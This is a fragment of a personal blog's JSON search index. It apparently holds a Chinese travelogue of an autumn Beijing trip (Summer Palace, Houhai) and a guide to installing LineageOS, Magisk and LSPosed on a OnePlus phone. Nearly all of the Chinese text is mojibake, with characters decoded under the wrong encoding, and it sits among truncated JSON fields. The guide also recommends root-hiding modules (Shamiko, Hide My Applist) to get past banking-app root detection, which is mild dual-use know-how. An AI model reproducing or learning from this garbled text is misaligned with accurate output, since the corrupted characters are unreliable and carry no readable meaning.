å‹æ‹ç…§, çº¸æ‰‡è½»æ‘‡, å›çœ¸ä¸€ç¬‘, æ°”è´¨ä¼˜é›…, æ¬é™ç«¯åº„, åªæ˜¯éƒ½æ²¡æœ‰æˆ‘çš„èº«è¾¹äººè¿™èˆ¬å¯çˆ±.\næ¥åˆ°è‹å·è¡—, æˆ‘å’Œyqæ²¿æ²³è€Œè¡Œ, å°å¿ƒè·¯è¿‡ä¸€é—´é—´æ— äººçš„å•†é“º. æ˜”æ—¥çš‡å¸ä¸ºåœ¨æ­¤é‡ç°æ±Ÿå—é£æƒ…, ä»¿ç…§æ°´é•‡åœ¨æ­¤åœ°å»ºé€ äº†ä¹°å–è¡—, ä¸“ä¾›å®«ä¸­äººæ¸¸è§ˆ, å³æ‰€è°“\u0026quot;å®«å¸‚\u0026quot;. è¿™ä¸ªåœ°æ–¹1860è¢«åˆ—å¼ºçƒ§æ¯, ä¸€ç™¾å¤šå¹´åæ‰ç”±å…±å’Œå›½é‡å»º, ç„¶è€Œæˆ‘å¯¹æ­¤ç±»çš‡å®¤å¨±ä¹å¹¶ä¸æ„Ÿå†’, åªæ˜¯ç´§å¼ åœ°ä¸€ééæé†’ä¸åœæ‹ç…§çš„yqå°å¿ƒåˆ«æŠŠæ‰‹æœºä¸¢è¿›æ²³é‡Œ.\nç»•äº†ä¸€åœˆè‹å·è¡—å‡ºæ¥, è¿é¢å°±æ˜¯ä¾å±±è€Œå»ºçš„å››å¤§éƒ¨æ´²å»ºç­‘ç¾¤, æ‹¾çº§è€Œä¸Š, å¯ä»¥çœ‹è§ä¸€å¤„å¹¿åœº, ä¸Šæœ‰27ä¸ªåœ†å½¢åº•åº§, æˆ‘ä»¬ä¸€è¾¹çŒœæµ‹å…¶ç”¨é€”, ä¸€è¾¹ç»§ç»­å‘ä¸Š, çœ‹è§äº†è®¸å¤šè—æ—é£æ ¼çš„å®ä¼Ÿå»ºç­‘, å¿ƒå¿µä¸€åŠ¨, åŸæ¥é‚£ä¸ªåœ°æ–¹æ˜¯ç”¨æ¥ç»™åƒ§äººæ‰“åç”¨çš„å•Š. åªæ˜¯å¯æƒœæ²¡æœ‰åŠ›æ°”å†å¾€ä¸Šäº†, ä¾¿ä¸‹äº†å±±.\nç”±äºä¹‹å‰é”™è¿‡äº†å‡ å¤„æ”¶è´¹çš„æ™¯ç‚¹, æˆ‘ä»¬ä¸€è¾¹å¿ç€è„šç—›, ä¸€è¾¹åŸè·¯è¿”å›, å¥½åœ¨ä¸æ˜¯å¾ˆè¿œ, ä¾¿æŠµè¾¾äº†å¾·å’Œå›­. è¿™é‡Œæ˜¯çš‡å¸å’Œå¤§è‡£ä»¬çœ‹æˆå‰§çš„åœ°æ–¹, å›´ç»•ç€ä¸¤å±‚æ¥¼çš„æˆå°æœ‰ä¸€å¼ å¼ æ¡Œæ¤…, æ˜¯å¤§è‡£è¢«é‚€è¯·æ¥è§‚èµæ—¶çš„åº§ä½, è€Œçš‡å¸åˆ™ååœ¨æ­£å¯¹ç€æˆå°çš„å®¤å†…è§‚çœ‹. æˆ‘çœ‹äº†çœ‹é‚£æ™®æ™®é€šé€šçš„æ¤…å­, åä¸Šå»å‡ ä¸ªå°æ—¶åº”è¯¥ä¸æ˜¯ä»€ä¹ˆå¾ˆäº«å—çš„ä½“éªŒ. å› ä¸ºä¹‹å‰èµ°ç´¯äº†, æˆ‘ä»¬ä¾¿ååœ¨æˆå°å‰çš„å°é˜¶ä¸Šç©ä¼šæ‰‹æœº, ç›¸äº’ä¾é çš„æ—¶å€™ç¨è§£äº†ç–²åŠ³.\nç”±äºæ—¶é—´æœ‰é™, æœ‰å¾ˆå¤šæ™¯ç‚¹æ²¡èƒ½è§‚èµ, åªèƒ½æŠ±ç€é—æ†¾å’Œå¤•é˜³ç¦»å¼€äº†.\nåæµ· ä¸æœ¬ç§‘åŒå­¦å»è¿‡ä¸€æ¬¡åæµ·, å¯¹é‚£è¾¹æœ‰æ¯”è¾ƒå¥½çš„å°è±¡, äºæ˜¯è¶æ­¤æœºä¼šå¸¦ç€yqå»äº†. åœ¨åæµ·å…¬å›­æ•£æ­¥çš„æ—¶å€™, æˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªç”»äººåƒç”»å¾—å¾ˆå¥½çš„å¤§çˆ·, yqç¼ ç€æˆ‘æƒ³è®©ä»–ç»™æˆ‘ä»¬ç”»åŒäººåƒ, ç›´åˆ°å‘ç°å‰é¢è¿˜æœ‰å¾ˆå¤šäººæ’é˜Ÿçš„æ—¶å€™æ‰ä½œç½¢. ä¸€è·¯ä¸Šåˆç»è¿‡ä¸€ä¸ªå–å¤–å›½é’±å¸çš„å°æ‘Š, é¢å‰æ‘†ç€ä¸€å¤§ç›†å„å›½é’±å¸, éšä¾¿æ‹¿ä¸€ä¸ªè€æ¿éƒ½èƒ½è¯´å‡ºå…¶æ‰€å±å›½å®¶å’Œè¯¥å›½çš„äº›è®¸å†å², ä»¤äººä½©æœ. æˆ‘æœ¬æ¥å¹¶æ²¡æœ‰å…´è¶£, åªæ˜¯å¸®ç€yqåœ¨æ—è¾¹æŒ‘äº›å¥½çœ‹çš„é’±å¸, ç›´åˆ°å¿½ç„¶çœ‹åˆ°ä¸€ä¸ªä¸Šé¢å°ç€é•°åˆ€é”¤å­å›¾æ¡ˆçš„ç¡¬å¸, è¿™é‡Œç«Ÿç„¶è‹è”çš„é’±å¸éƒ½æœ‰, èµ¶ç´§ä¹°äº†ä¸€ä¸ª, åˆšä¹°å®Œæ—è¾¹åˆæœ‰ä¸€ä¸ªç”·ç”Ÿæ¥é—®è€æ¿æœ‰æ²¡æœ‰è‹è”è§£ä½“å‰çš„ç¡¬å¸, å¿ƒæƒ³æœç„¶å…±å’Œå›½çš„ç”·äººéƒ½å–œæ¬¢è‹è”.\nåæµ·é‚£è¾¹æœ‰è®¸å¤šé…’å§ä¸é©»å”±æ­Œæ‰‹, æˆ‘ä»¬å¬ä¸€å¬, çœ‹ä¸€çœ‹, èµ°ä¸€èµ°, åœ¨è·¯è¾¹çš„å„ç§æ–‡åˆ›åº—å’Œç”µç©åº—ä¹‹é—´ç©¿æ¢­ (è¿™åœ°æ–¹ä¸ºä»€ä¹ˆæœ‰è¿™ä¹ˆå¤šç”µç©åº—?) . ä¸çŸ¥ä¸è§‰å°±åˆ°äº†æ™šé¥­æ—¶é—´, æˆ‘ä»¬æ²¿ç€å»åœ°é“çš„è·¯, é’»è¿›äº†å°å··, æ‘†è„±äº†è¡—ä¸Šç†™ç†™æ”˜æ”˜çš„äººæµ, å·¦è½¬å³è½¬, å¶é‡ä¸€å®¶ç‚¸é…±é¢é¦†, é—¨å‰å¤§çˆ·å•¤é…’é¢æ¡, çƒ­çƒ­é—¹é—¹, å¥½ä¸å¿«æ´». å‡ºäºå¥½å¥‡, æˆ‘ä»¬ä¹Ÿè¿›å»åƒäº†ä¸€ç¢—, ä»·æ ¼å®æƒ , å‘³é“ä¹Ÿä¸é”™, æˆ–è®¸æ›´å¸å¼•æˆ‘ä»¬çš„, æ˜¯è¿™é‡Œçš„çƒŸç«æ°”æ¯å§. åªæ˜¯å‡ºäº†å°åº—å, æ²¡èµ°äº”å…­ç±³, å¿½ç„¶å‘ç°å¦ä¸€å®¶ç‚¸é…±é¢åº—, è¿™å®¶åº—é—¨å£çš„è¶…é•¿é˜Ÿä¼è®©æˆ‘ä»¬æƒŠè®¶ä¸å·²: ä¸è¿‡æ˜¯ä¸€å®¶åœ¨å··å­ä¸­çš„é¢åº—, è‡³äºè¿™ä¹ˆ\u0026quot;å…´å¸ˆåŠ¨ä¼—\u0026quot;å—? å¯æƒœå·²ç»åƒè¿‡äº†, åªå¥½å…ˆè¡Œç¦»å¼€, æ¥æ—¥æœ‰æœºä¼šè¯•è¯•.\nèµ°ç€èµ°ç€, ä»é»„æ˜èµ°åˆ°é»‘å¤œ, ä»å°å··çš„è¿™å¤´èµ°åˆ°é‚£å¤´, ä»ç°ä»£åŒ–çš„è¡—é“èµ°åˆ°ç®€é™‹çš„è€å®…è¾¹. æ˜é»„çš„ç¯å…‰äº®èµ·, å¤´é¡¶çš„ç”µçº¿æŠ•ä¸‹äº†äº¤é”™çš„å½±å­. æˆ‘ä»¬æ‰‹ç‰µç€æ‰‹, ä»å–§åš£çš„äººç¾¤èµ°åˆ°å®‰é™çš„çŒ«å„¿èº«è¾¹, yqæƒ³æ‹ä¸ªå··å­é‡Œçš„ç…§ç‰‡, å¯¹å®ƒè¯´: \u0026ldquo;å˜¿çŒ«çŒ«, çœ‹è¿™é‡Œ\u0026rdquo;, çŒ«å’ªå¥½å¥‡åœ°è½¬è¿‡å¤´, äºæ˜¯ç¾å¥½è¢«å®šæ ¼åœ¨äº†ç…§ç‰‡ä¸­.\nåè®° è·¯ä¸Šæˆ‘ä¸€ç›´åœ¨æ€è€ƒ, åˆ°åº•ä»€ä¹ˆæ ·çš„äººå€¼å¾—ä¸€ä¸ªæ›´å¥½çš„æœªæ¥, æ˜¯æ›´è‡ªç§, æ›´åŠ¿åˆ©, æ›´å–„äºä¼ªè£…è‡ªå·±æ¥è¿åˆåˆ«äººå´åœ¨åˆ©ç”¨å®Œåˆ«äººä¹‹åæ€åº¦ç¬é—´å‘ç”Ÿ180åº¦è½¬å¼¯çˆ±æ­ä¸ç†çš„äºº? è¿˜æ˜¯æ›´å†·æ¼ , ä¸åœæ’é™¤å¼‚å·±, çœ¼ä¸­åªæœ‰è‡ªå·±å’Œæ‰€å±çš„å°åœˆå­çš„äºº? æˆ‘å¹¶ä¸çŸ¥é“, æˆ‘åªçŸ¥é“æˆ‘èº«è¾¹çš„å¥³å­©, åœ¨ç»å†è¿‡ä¸€æ¬¡æ¬¡åœ°ç—›è‹¦, æ²®ä¸§å’Œæ— å¥ˆå, ä¾ç„¶è¢«çˆ±å¥¹çš„äººåšå®šä¸ç§»åœ°é€‰æ‹©ç€, æ”¯æŒç€å¹¶æ‹¥æŠ±ç€, è€Œå¥¹ä¹Ÿæ²¡æœ‰è¾œè´Ÿè‡ªå·±æ‰€æ›¾ç»é­å—è¿‡çš„è‹¦éš¾, æ²¡æœ‰å˜å¾—æ›´åŠ çš„\u0026quot;æˆç†Ÿ\u0026quot;, è€Œæ˜¯ä¿æŒå–„è‰¯, ä¸€æ­¥ä¸€æ­¥ç¼“æ…¢ä½†åšå®šä¸ç§»åœ°å‘ç€ä¸€ä¸ªè®©æˆ‘ä»¬æœ‰æ‰€æœŸå¾…çš„æœªæ¥å‰è¿›ç€.\n","permalink":"https://dragonbox.top/posts/gossip-beijing-travel-2023-2/","summary":"\u003cblockquote\u003e\n\u003cp\u003eä¸æ‰€çˆ±ä¹‹äººåœ¨ä¸€èµ·çš„æ—¶å…‰, ä¼šç”Ÿå‡ºäº’ç›¸çš„çæƒœ, è¿™ä»½çæƒœçŠ¹å¦‚é£ç­çº¿ä¸€èˆ¬, å³ä¾¿å¯¹æ–¹è¿œåœ¨äº‘ç«¯, ä¾æ—§å¯ä»¥æ„ŸçŸ¥åˆ°å…¶å¿ƒå¿µæ‰€åŠ¨, äºæ˜¯æ€å¿µç”±æ­¤è€Œç”Ÿ.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eåœ¨yqæˆåŠŸä¸Šå²¸å®¶ä¹¡çš„æ•™å¸ˆç¼–å, ä¸ºäº†åº†ç¥, ä¹Ÿä¸ºäº†ç¼“è§£è®¸ä¹…æœªè§çš„ç›¸æ€ä¹‹è‹¦, æˆ‘åŒ†å¿™è®¡åˆ’äº†ä¸€ä¸‹è¡Œç¨‹, ä¸€è¾¹è®©å¥¹è®¢æ¥åŒ—äº¬çš„è½¦ç¥¨,  ä¸€è¾¹æ€è€ƒé™„è¿‘å“ªé‡Œæœ‰å–é¦™æ§Ÿçš„.\u003c/p\u003e\n\u003ch2 id=\"é¢å’Œå›­\"\u003eé¢å’Œå›­\u003c/h2\u003e\n\u003cp\u003eé€‰æ‹©é¢å’Œå›­, æ˜¯å› ä¸ºç¦»ä¿¡å·¥æ‰€æ¯”è¾ƒè¿‘. å½“æ—¥åŸæœ¬æƒ³å¸¦yqå»æˆ‘å¹³æ—¶å»çš„æ—©é¤åº—, å¯æƒœæˆ‘ä»¬å‡ºå‘ä¹‹æ—¶, å·²æ˜¯ä¸­åˆåäºŒç‚¹äº†, äºæ˜¯å¸¦å¥¹åƒä¹‹å‰æ¨èè¿‡çš„æ„å¤§åˆ©æ²™å¿è¨è‰äºš. è¿™æ˜¯ä¸€ä¸ªä»·æ ¼éå¸¸äº²æ°‘çš„æ„å¤§åˆ©è¥¿é¤å…, çœ‹äº†çœ‹èœå•ä¸Šåå‡ äºŒåå…ƒçš„èœå“å, æˆ‘ä»¬å½»åº•æ”¾ä¸‹äº†å¯¹ä»·æ ¼çš„é¡¾è™‘, ä»…ä»…è€ƒè™‘å£å‘³å’Œèƒƒå£. å®é™…ä¸Šè¿™å®¶åº—çš„å£å‘³ç¡®å®ä¸é”™, ç‰¹åˆ«æ˜¯è˜‘è‡æµ“æ±¤, è™½ç„¶è‚¯å®šä¸èƒ½è¯´é¡¶çº§, ä½†è¿™ç§ä¸ç”¨é¡¾è™‘ä»·æ ¼å°±äº«å—è¥¿é¤çš„è½»æ¾æ„Ÿ, ç‹¬æ­¤ä¸€ä»½ (è¯´ç™½äº†è¿˜æ˜¯å¤ªç©·).\u003c/p\u003e\n\u003cp\u003eé˜³å…‰æ­£å¥½, æ™’åœ¨èº«ä¸Šæš–æ´‹æ´‹çš„. æˆ‘ä»¬åœ¨ä¸‹å…¬äº¤ä¹‹å, æ…¢æ…¢æ‚ æ‚ å‰å¾€é¢å’Œå›­çš„å…¥å£, è·¯ä¸Šè½å¶é£èˆ, å´æ— åŠç‚¹è§æ¡, è¡Œäººæ¥æ¥å¾€å¾€, ä¸€ä¸ªå©´å„¿è½¦é‡Œçš„å°å­©æŒ‡ç€å¦ä¸€ä¸ªåœ¨å¦ˆå¦ˆè‡ªè¡Œè½¦è½¦ç­é‡Œçš„å°å­©ç¾¡æ…•åœ°å“‡å“‡ç›´å«, æƒ¹å¾—ä¸¤è¾¹çš„å®¶é•¿å¿ä¿Šä¸ç¦. èµ°èµ°åœåœä¹‹é—´, æˆ‘ä»¬æ—¶è€Œåœ¨è·¯è¾¹çš„äº­å­é‡Œæ­‡è„š, æ—¶è€Œåœ¨çº¢ç –ç»¿ç“¦çš„ä¸çŸ¥ååºœé—¨å‰é©»è¶³æ‹ç…§, å¿ƒä¸‹ä¸€ç‰‡é—²é€‚.\u003c/p\u003e\n\u003cp\u003eè¿›å…¥é¢å’Œå›­åæ‰å‘ç°è¿™é‡Œå‡ºä¹æ„æ–™çš„å¤§, ä½†æƒ³æƒ³è¿™æ¯•ç«Ÿæ˜¯çš‡å¸çš„æ¸¸ç©ä¹‹åœ°, å€’ä¹Ÿç®—åˆç†. æˆ‘ä»¬ç»•è¿‡å¨æ­¦çš„éº’éºŸåƒ, è·¯è¿‡çš‡å¸æ…ˆç¦§ä¸´æ—¶å¬æ”¿çš„ä»å¯¿å®«å’Œä¸€æ£µæ£µç™¾å¹´é¾™æŸ, ç©¿è¿‡åŸå…³, æ¥åˆ°è°è¶£å›­. å› ä¸ºæ˜¯ç§‹å¤©çš„ç¼˜æ•…, å°½ç®¡æ°”æ¸©å¹¶ä¸è®©äººè§‰å¾—æœ‰ç§‹æ„, ä½†æ˜¯æ± ä¸­çš„è·èŠ±å·²ç»å°½æ•°æ¯è, é£å…‰ä¸å†, å®›å¦‚é‚£ä¸ªæ­»å»å¤šæ—¶çš„ç‹æœ. æ²¿ç€å›å»Šè¡Œèµ°, æˆ‘æ¼äºè¿™è¡Œèµ°çš„ç©ºé—´ç«Ÿç„¶å¦‚æ­¤ç‹­çª„, å¤ä»£çš„çš‡å¸ä¸ä¸äººå¹¶è‚©è¡Œèµ°, å…¶ä»–çš„äººåªèƒ½å°¾éš, å› æ­¤å‡¡æ˜¯èµ°å»Šä¸€ç±»çš„åœ°æ–¹éƒ½å¯ä»¥è®¾è®¡åœ°çª„å°ä¸€äº›, åªæ˜¯æˆ‘ä¸ç¦å¼€å§‹æ— ç«¯æ€è€ƒ, é•¿æœŸåœ°å¤„äºè¿™æ ·çš„ç©ºé—´é‡Œ, äººçš„å¿ƒèƒ¸çœ¼ç•Œæ˜¯å¦ä¹Ÿä¼šå˜å¾—ç‹­å°å‘¢?\u003c/p\u003e\n\u003cp\u003eä¸€è·¯ä¸Šçœ‹åˆ°äº†è®¸å¤šæ ¼æ ¼æ‰“æ‰®çš„å¥³ç”Ÿåœ¨å‡¹é€ å‹æ‹ç…§, çº¸æ‰‡è½»æ‘‡, å›çœ¸ä¸€ç¬‘, æ°”è´¨ä¼˜é›…, æ¬é™ç«¯åº„, åªæ˜¯éƒ½æ²¡æœ‰æˆ‘çš„èº«è¾¹äººè¿™èˆ¬å¯çˆ±.\u003c/p\u003e\n\u003cp\u003eæ¥åˆ°è‹å·è¡—, æˆ‘å’Œyqæ²¿æ²³è€Œè¡Œ, å°å¿ƒè·¯è¿‡ä¸€é—´é—´æ— äººçš„å•†é“º. æ˜”æ—¥çš‡å¸ä¸ºåœ¨æ­¤é‡ç°æ±Ÿå—é£æƒ…, ä»¿ç…§æ°´é•‡åœ¨æ­¤åœ°å»ºé€ äº†ä¹°å–è¡—, ä¸“ä¾›å®«ä¸­äººæ¸¸è§ˆ, å³æ‰€è°“\u0026quot;å®«å¸‚\u0026quot;. è¿™ä¸ªåœ°æ–¹1860è¢«åˆ—å¼ºçƒ§æ¯, ä¸€ç™¾å¤šå¹´åæ‰ç”±å…±å’Œå›½é‡å»º, ç„¶è€Œæˆ‘å¯¹æ­¤ç±»çš‡å®¤å¨±ä¹å¹¶ä¸æ„Ÿå†’, åªæ˜¯ç´§å¼ åœ°ä¸€ééæé†’ä¸åœæ‹ç…§çš„yqå°å¿ƒåˆ«æŠŠæ‰‹æœºä¸¢è¿›æ²³é‡Œ.\u003c/p\u003e","title":"2023 è®°åŒ—äº¬ç§‹æ¸¸"},{"content":" 2024å¹´7æœˆæ›´æ–°: ç»è¿‡äº†åŠå¹´çš„æ—¶å€™, é‡åˆ°çš„é—®é¢˜åŒ…æ‹¬ä½†ä¸é™äº 1) å¾®ä¿¡å¡é¡¿ 2) é“¶è¡Œç±»appæ— æ³•ä½¿ç”¨ 3) system UIç»å¸¸å´©æºƒ 4) å¿«å……æ¶ˆå¤±. å‡ºäºå¯ç”¨æ€§è€ƒè™‘, å·²ç»è½¬å›coloros\n2024å¹´2æœˆæ›´æ–°: Lsposedè¿åŒä¸€ç³»åˆ—rootéšè—æ¨¡å—å·²ç»å½’æ¡£æ— æ³•ä½¿ç”¨, ä¸ºäº†æ–¹ä¾¿æ—¥å¸¸ä½¿ç”¨, å»ºè®®å¸è½½magisk, åˆ·æœºçš„æ—¶ä»£å·²ç»è¿‡å»äº†.\nä¸çŸ¥é“ä»ä»€ä¹ˆæ—¶å€™å¼€å§‹, å¾€æ—¥è¢«å† ä»¥é«˜å¯ç©æ€§é«˜è‡ªç”±åº¦çš„å®‰å“ç³»ç»Ÿé€æ¸å˜å¾—å°é—­, ä¸€æ­¥æ­¥æ²¦ä¸ºèµ„æœ¬å¸‚åœºçš„ç©ç‰©å’Œå·¥å…·. MIUIä¹Ÿå¥½, ColorOSä¹Ÿç½¢, ç”¨æˆ·æ€»èƒ½åœ¨ä½¿ç”¨ç³»ç»Ÿçš„è¿‡ç¨‹ä¸­å‘ç°ä¸€äº›å»ä¹Ÿå»ä¸æ‰çš„åº”ç”¨å’Œå°ç¨‹åº, çœ‹åˆ°ä¸€äº›ä¸æƒ³çœ‹ä¹Ÿå¾—çœ‹çš„å¹¿å‘Š, è€Œèµ·åˆ, æœ‰äº›äººå°½ç®¡å¯¹æ­¤æœ‰æ‰€ä¸æ»¡, ä½†åŸºæœ¬éƒ½é€‰æ‹©å®¹å¿çš„æ€åº¦, ä½†è¿™å‡ å¹´å›½å†…çš„è¶‹åŠ¿è¶Šæ¥è¶Šä¸å¯¹åŠ²: å…ˆæ˜¯æŸAPPåœ¨å…¨ç¤¾ä¼šçš„å®£ä¼ ä¸‹æˆ–è½¯æ€§æˆ–ç¡¬æ€§åœ°è¢«å®‰è£…åœ¨äº†ç›¸å½“å¤§ä¸€éƒ¨åˆ†äººçš„æ‰‹æœºä¸­ç›‘æ§ä¸ªäººä¿¡æ¯(å½“ç„¶, æˆ‘ç†è§£æ‰“å‡»è¯ˆéª—è¡Œä¸º, ä¿æŠ¤å¹³æ°‘ç™¾å§“çš„é’±åŒ…è¿œæ¯”è½¯ä»¶è‡ªç”±é‡è¦å¾—å¤š), åˆæ˜¯æ‹¼å¤šå¤šè¢«çˆ†å‡ºåˆ©ç”¨å®‰å“æ‰‹æœºçš„0dayæ¼æ´åœ¨æ‰€æœ‰ç”¨æˆ·çš„æ‰‹æœºä¸Šè¿›è¡Œå¤šç§æ¶æ„è¡Œä¸º, ä¸€ç›´åˆ°æœ€è¿‘, ä¸€åˆ™æŸä¿¡éƒ¨çš„å‘æ–‡é€šçŸ¥å°†è¿™ç§ æˆ‘çš„æ‰‹æœºä¸å½’æˆ‘ç®¡ çš„ç„¦è™‘æ„Ÿæ¨å‘äº†æ–°çš„é«˜æ½®.\nå°±ç›®å‰æ¥çœ‹, è¿™åˆ™é€šçŸ¥çš„ç¤¾ä¼šåå“å¹¶ä¸å¼ºçƒˆ, ä¸å‡ºæ„å¤–åº”è¯¥å¯ä»¥é¡ºåˆ©æ¨è¡Œ. ä¹‹åæœ€ç›´è§‚çš„æ•ˆæœå°±æ˜¯æ‰€æœ‰ä½¿ç”¨å›½å†…å®‰å“ç³»ç»Ÿçš„ç”¨æˆ·éƒ½åªèƒ½å®‰è£…æŒ‡å®šçš„app, ä¸å†å…·å¤‡å®‰è£…æ¨ç‰¹ç­‰è½¯ä»¶çš„èƒ½åŠ›, è¿™æ— å¼‚äºå¹²æ‰äº†å®‰å“æœ€å¤§çš„ç‰¹ç‚¹, ä½¿å…¶æ²¦è½ä¸ºå…¨æ–¹ä½è½åäºè‹¹æœçš„æ‰‹æœºç³»ç»Ÿ. ä½œä¸ºä¸€ä¸ªç»å†è¿‡å®‰å“appçˆ†å‘å¼å¢é•¿å¹´ä»£çš„ç©å®¶, æˆ‘å¾ˆå¥½å¥‡ç°åœ¨æ–°æ¥è§¦åˆ°æ‰‹æœºçš„ç”¨æˆ·å¯¹è‡ªå·±æŒä¸­çš„è®¾å¤‡æ˜¯ä¸€ä¸ªä»€ä¹ˆæ ·çš„å°è±¡, æ˜¯ä¸€ä¸ªæ‹¥æœ‰æ— é™å¯èƒ½çš„å·¥å…·? è¿˜æ˜¯ä¸€ä¸ªç”¨ä½è´¨é‡å†…å®¹, å¹¿å‘Šå’Œå……æ»¡é™åˆ¶çš„æ“ä½œç³»ç»Ÿæ¥æ— é™å¸æ”¶æ³¨æ„åŠ›, è·å–ä¸ªäººéšç§å¹¶å˜ç›¸ç®¡ç†ä¸ªäººç²¾ç¥ä¸–ç•Œçš„èµ„æœ¬å’Œæ”¿åºœå·¥å…·?\nä¸‡å¹¸çš„æ˜¯, å®‰å“çš„å¼€æºå±æ€§ä¸ºå®ƒä¿ç•™ä¸‹äº†ä¸€äº›è‡ªç”±çš„ç«ç§, é‚£è¾¹æ˜¯ç¬¬ä¸‰æ–¹rom. æœ¬æ–‡ä¸»è¦è®°å½•è‡ªå·±å®‰è£… lineageos, magisk, Lsposed ä»¥åŠä¸€äº›æœ‰ç”¨è½¯ä»¶çš„è¿‡ç¨‹.\nè´­ä¹°æœºå™¨ æŸ¥çœ‹lineageosæ”¯æŒçš„è®¾å¤‡åˆ—è¡¨, å‡ºäºå¯¹ä¸€åŠ çš„åå¥½å’Œå¯¹éªé¾™888å‘çƒ­çš„ä¸æ”¾å¿ƒ, æˆ‘é€‰æ‹©ä»¥ä¸€åŠ 8proä½œä¸ºè‡ªå·±çš„æ–°è®¾å¤‡. åœ¨å’¸é±¼ä¸Šé€›äº†å¾ˆä¹…, ç­›æ‰ä¸€å¤§æ‰¹æœºå™¨è´©å­å’Œä½è´¨é‡å–å®¶å, æˆ‘çœ‹ä¸­äº†ä¸€ä½å®å¦ˆçš„äºŒæ‰‹æœºå¹¶ä¸‹å•. æœºå™¨åˆ°æ‰‹åæˆ‘éå¸¸æ»¡æ„, å› ä¸ºæˆè‰²å®åœ¨æ˜¯å¾ˆå¥½, è¿ç»´ä¿®åº—é‡Œç»™æˆ‘æ‰‹æœºæ¢ç”µæ± çš„å·¥ç¨‹å¸ˆä¹Ÿèµå¹ä¿å…»å¾—ä¸é”™, è¿™1700è™½ç„¶æœ‰ç‚¹è´µ, ä½†è¿˜æ˜¯å€¼å¾—çš„.\nLineageos è¿™ä¸€æ­¥æˆ‘æ²¡æœ‰ä»€ä¹ˆéœ€è¦è¡¥å……çš„, åªéœ€è¦æŒ‰ç…§ lineageosçš„wikiä¸€æ­¥ä¸€æ­¥æ¥å°±å¯ä»¥, ä¸è¦è·³æ­¥, ä»”ç»†æ…¢æ…¢æ“ä½œ. æ³¨æ„è¦æŒ‰ç…§è‡ªå·±æ”¯æŒçš„æœºå‹çš„wikiæ“ä½œå°±è¡Œ.\nmagisk æŒ‰ç…§ https://magiskcn.com/oneplus-magisk ä¸­çš„ç¬¬ä¸ƒæ­¥å®‰è£…magisk app, ç„¶åä½¿ç”¨åœ¨å®‰è£…lineageosæ—¶å€™ä¸‹è½½çš„boot.img å»æ“ä½œæ¥ä¸‹æ¥çš„æ­¥éª¤, é‡å¯å°±å¯ä»¥äº†.\næ¥ä¸‹æ¥ä»‹ç»å‡ ä¸ªæˆ‘è§‰å¾—æ¯”è¾ƒæœ‰ç”¨çš„æ¨¡å—\nShamiko å®‰è£…å®Œmagiskä¹‹å, éƒ¨åˆ†APP(é‡‘èç±»å’Œé€šä¿¡ç±»)ä¼šå› ä¸ºæ£€æµ‹åˆ°rootç¯å¢ƒè€Œç›´æ¥é€€å‡º, ä¸ºäº†é¿å…è¿™äº›é—®é¢˜, æˆ‘ä»¬éœ€è¦æŒ‰ç…§ä¸€ä¸ªå¯ä»¥éšè—rootç¯å¢ƒçš„æ¨¡å—æ¥è®©ä»–ä»¬æ­£å¸¸å·¥ä½œ.\næŒ‰ç…§ https://magiskcn.com/shamiko-install é‡Œé¢çš„æ“ä½œå®‰è£…shamikoæ¨¡å—, å¯åŠ¨é—ªé€€çš„APPçœ‹çœ‹èƒ½ä¸èƒ½æ­£å¸¸å¯åŠ¨ (ä¸­å›½ç§»åŠ¨å¯ä»¥å¯åŠ¨çš„è¯å°±æ²¡é—®é¢˜)\nLSPosed æŒ‰ç…§ å®˜ç½‘æŒ‡ç¤º å®‰è£…å³å¯. æ¥ä¸‹æ¥ä»‹ç»ä¸€ä¸‹æˆ‘ä½¿ç”¨çš„æ¨¡å—\nADå¿«æ¶ˆ å»é™¤é‚£äº›å›½äº§è½¯ä»¶å¼€å±æ—¶å€™çš„ç‰›çš®è—“å¹¿å‘Š, æ³¨æ„è¿™å¯èƒ½ä¼šè®©æŸäº›APPæ— æ³•å¯åŠ¨, é‡åˆ°è¿™ç§æƒ…å†µä¸è¦è®©è¯¥æ¨¡å—ä½œç”¨äºè¿™äº›APPå°±è¡Œ.\nWeXposed (å¾®X) å¾ˆå®ç”¨çš„å¾®ä¿¡å¢å¼ºæ¨¡å—\nHide My Applist éšè—APPåˆ—è¡¨ä¸­çš„æŸäº›APP, ç”¨äºéšè—ä¸€äº›ä¸æƒ³è®©åˆ«äººçœ‹åˆ°çš„Applist, ç”¨äºç»•è¿‡æŸäº›APP(ä¾‹å¦‚å·¥å•†é“¶è¡Œ)çš„æ£€æµ‹\nhttps://magiskcn.com/hide-my-applist\nå…¶ä»–è½¯ä»¶ Revanced å»é™¤Youtubeçš„é™åˆ¶, è§£é”åå°æ’­æ”¾ç­‰åŠŸèƒ½.\nä¸‹è½½ https://github.com/j-hc/revanced-magisk-module/releases/ ä¸­çš„youtube-revanced.apkç„¶åå®‰è£…, å¯åŠ¨åæŒ‰ç…§æŒ‡ç¤ºå®‰è£…microGæ¡†æ¶å°±å¯ä»¥ä½¿ç”¨äº†\n","permalink":"https://dragonbox.top/posts/tech-lineageos-md/","summary":"\u003cblockquote\u003e\n\u003cp\u003e2024å¹´7æœˆæ›´æ–°: ç»è¿‡äº†åŠå¹´çš„æ—¶å€™, é‡åˆ°çš„é—®é¢˜åŒ…æ‹¬ä½†ä¸é™äº 1) å¾®ä¿¡å¡é¡¿ 2) é“¶è¡Œç±»appæ— æ³•ä½¿ç”¨ 3) system UIç»å¸¸å´©æºƒ 4) å¿«å……æ¶ˆå¤±. å‡ºäºå¯ç”¨æ€§è€ƒè™‘, å·²ç»è½¬å›coloros\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e2024å¹´2æœˆæ›´æ–°: Lsposedè¿åŒä¸€ç³»åˆ—rootéšè—æ¨¡å—å·²ç»å½’æ¡£æ— æ³•ä½¿ç”¨, ä¸ºäº†æ–¹ä¾¿æ—¥å¸¸ä½¿ç”¨, å»ºè®®å¸è½½magisk, åˆ·æœºçš„æ—¶ä»£å·²ç»è¿‡å»äº†.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cp\u003eä¸çŸ¥é“ä»ä»€ä¹ˆæ—¶å€™å¼€å§‹, å¾€æ—¥è¢«å† ä»¥é«˜å¯ç©æ€§é«˜è‡ªç”±åº¦çš„å®‰å“ç³»ç»Ÿé€æ¸å˜å¾—å°é—­, 